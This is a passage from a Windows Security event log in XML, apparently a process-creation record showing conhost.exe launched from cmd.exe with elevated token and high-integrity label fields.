      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xf18</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  